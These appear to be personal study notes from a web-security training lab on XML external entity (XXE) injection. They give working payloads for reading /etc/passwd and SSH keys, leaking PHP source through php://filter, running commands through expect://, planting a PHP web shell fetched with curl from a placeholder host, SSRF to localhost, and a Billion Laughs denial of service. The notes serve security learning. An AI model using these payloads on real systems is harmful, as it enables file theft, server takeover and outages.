# XXE — Local File Disclosure Notes

## Local File Disclosure

If a web application accepts unfiltered XML input, attacker may define external XML entities to read local files from backend server.

---

# Identifying XXE

## Step 1: Find XML Input

Look for requests using XML format.

Example intercepted request:

```http
POST /submitDetails.php HTTP/1.1
Content-Type: application/xml
```

Example XML request:

```xml
<?xml version="1.0"?>

<details>
    <name>sonam</name>
    <tel>123456789</tel>
    <email>test@test.com</email>
    <message>Hello</message>
</details>
```


![[Pasted image 20260515191231.png]]

---

# Step 2: Check Reflected Fields

Find which XML element value appears in response.

Example:

```xml
<email>test@test.com</email>
```

Response:

```text
Check your email test@test.com for further instructions.
```

Here, `email` field is reflected.

---

# Step 3: Test XML Entity Injection

Add custom ENTITY inside DTD:

```xml
<?xml version="1.0"?>

<!DOCTYPE email [
    <!ENTITY company "Inlane Freight">
]>

<details>
    <email>&company;</email>
</details>
```

![[Pasted image 20260515191246.png]]

---

# Successful XXE Indicator

If response shows:

```text
Check your email Inlane Freight for further instructions.
```

instead of:

```text
&company;
```

then XML entities are being parsed → XXE possible.

---

# Reading Local Files

Use external entity with SYSTEM keyword:

```xml
<?xml version="1.0"?>

<!DOCTYPE email [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<details>
    <email>&xxe;</email>
</details>
```

---

# SYSTEM Keyword

Used to load external resources.

Example:

```xml
SYSTEM "file:///etc/passwd"
```

---

# Important Note

If XML request already contains:

```xml
<!DOCTYPE ...>
```

then only add ENTITY inside existing DTD.

Do not create another DOCTYPE.

---

# JSON to XML Note

Some applications use JSON by default but may still accept XML.

Change:

```http
Content-Type: application/json
```

to:

```http
Content-Type: application/xml
```

Then convert JSON data to XML and test for XXE.

# XXE – Reading Sensitive Files

## Read Local Files

### External Entity

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

### Usage

```xml
<email>&company;</email>
```

![[Pasted image 20260515191530.png]]
### What Happens

- XML parser reads `/etc/passwd`
    
- Replaces `&company;` with file content
    
- File content is shown in response
    

### Impact

- Read sensitive files
    
- Leak configs/passwords
    
- Read SSH keys
    
- Information disclosure
    

### Note

Some Java apps may allow directory listing instead of file reading.

---

# Reading Source Code

## Problem

Trying to read source directly may fail:

```xml
<!ENTITY company SYSTEM "file:///var/www/html/index.php">
```

### Why?

PHP source contains XML special characters:

- `<`
    
- `>`
    
- `&`
    

These break XML parsing.

---

# PHP Filter Bypass

## Payload

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

## What It Does

- Reads `index.php`
    
- Base64 encodes file
    
- Safe for XML parser
    
- Returns encoded source code
    
![[Pasted image 20260515191551.png]]

---


# Decode Result

Returned base64 can be decoded to get:

- PHP source code
    
- Database credentials
    
- API keys
    
- Hidden endpoints
    

---

# Important 

- `file://` → read normal files
    
- `php://filter/convert.base64-encode/resource=` → read PHP source safely
    
- PHP filter trick works only on PHP applications
    
- Useful for whitebox-style analysis after XXE exploitation.

# XXE – Remote Code Execution (RCE)

## Goal

Use XXE to execute commands on the target server.

---

# Methods for XXE → RCE

## 1. Read SSH Keys

- Read private SSH keys using XXE
    
- Login to server via SSH
    

Example:

```xml
<!ENTITY key SYSTEM "file:///home/user/.ssh/id_rsa">
```

---

## 2. Windows Hash Stealing

- Make server connect to attacker machine
    
- Capture NTLM hashes
    

---

## 3. PHP `expect://` RCE

### Requirement

- PHP `expect` module must be installed/enabled
    

---

# Direct Command Execution

## Payload

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
```

## Result

Runs:

```bash
id
```

and prints output.

---

# Problem with Complex Commands

Commands with:

- spaces
    
- `|`
    
- `>`
    
- `{}`
    

may break XML syntax.

---

# Best Method → Upload Web Shell

## Step 1 – Create PHP Shell

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```

---

## Step 2 – Start Python Web Server

```bash
sudo python3 -m http.server 80
```

Serves:

```bash
http://OUR_IP/shell.php
```

---

# XXE Payload to Download Shell

```xml
<?xml version="1.0"?>

<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>

<root>
  <name></name>
  <tel></tel>
  <email>&company;</email>
  <message></message>
</root>
```

---

#### `$IFS`

## Meaning

Shell variable representing:

```bash
space
```

Used instead of normal spaces to avoid XML breaking.

Example:

```bash
curl -O shell.php
```

becomes:

```bash
curl$IFS-O$IFSshell.php
```

---

#### After Sending Payload

Target server:

1. Executes curl command
    
2. Downloads `shell.php`
    
3. Stores web shell on server
    

Then access:

```bash
http://target/shell.php?cmd=id
```

---

# Important 

- `expect://` works only if PHP expect module is enabled
    
- Not enabled by default on modern servers
    
- XXE is more commonly used for:
    
    - file disclosure
        
    - source code reading
        
    - config leakage

# Other XXE Attacks

## 1. SSRF via XXE

Use XXE to:

- access internal services
    
- scan localhost ports
    
- access restricted pages
    

Example:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
```

# 2. XXE Denial of Service (DOS)

## Billion Laughs Attack

### Idea

Entities reference each other repeatedly.

Example:

  ```
       xml
`<?xml version="1.0"?> <!DOCTYPE email [   <!ENTITY a0 "DOS" >  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">         ]> <root> <name></name> <tel></tel> <email>&a10;</email> <message></message> </root>`
  ```

This expands massively and consumes:

- RAM
    
- CPU
    

Result:

- server crash
    
- application freeze
    

---

# Modern Protection

Modern servers (Apache, updated parsers):

- limit entity expansion
    
- block recursive entities
    
- prevent DOS attacks
